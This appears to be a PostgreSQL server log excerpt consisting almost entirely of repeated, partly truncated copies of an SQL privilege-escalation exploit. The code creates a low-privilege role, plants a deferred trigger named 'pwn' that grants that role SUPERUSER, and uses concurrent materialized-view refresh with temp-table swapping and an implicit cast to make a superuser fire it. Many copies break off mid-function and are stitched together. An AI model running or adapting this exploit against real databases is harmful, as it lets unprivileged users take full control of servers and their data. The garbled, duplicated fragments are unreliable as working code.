        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        BEGIN

              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);

            RETURN 1; 
        END

            );

        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

            target TEXT := get_target();
        BEGIN

              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);

            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

                RAISE WARNING '-- user % --', current_user;

            END IF;

            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;

            END IF;

            RETURN NEW;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED

        CREATE FUNCTION get_target() RETURNS TEXT AS $$

              pg_my_temp_schema()::regnamespace,

            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

2026-04-14 18:02:20.277 UTC [1845] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        CREATE DATABASE rdb OWNER r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$

            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
2026-04-14 19:13:39.265 UTC [5898] ERROR:  syntax error at or near "CONNECT" at character 54
2026-04-14 19:13:39.265 UTC [5898] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            DROP VIEW IF EXISTS remove_later;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
